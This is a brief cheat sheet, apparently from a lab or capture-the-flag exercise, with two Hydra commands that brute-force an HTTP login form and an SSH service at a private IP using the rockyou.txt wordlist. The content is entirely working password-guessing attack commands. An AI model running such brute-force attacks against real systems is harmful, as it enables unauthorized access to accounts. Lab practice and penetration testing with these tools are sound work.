# Cheatsheet Hydra

## Hydra http form bruteforce

```
hydra -l molly -P rockyou.txt 10.10.4.128 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V
```

## Hydra SSH Bruteforce

```
hydra -l molly -P rockyou.txt 10.10.4.128 ssh -V -I
```

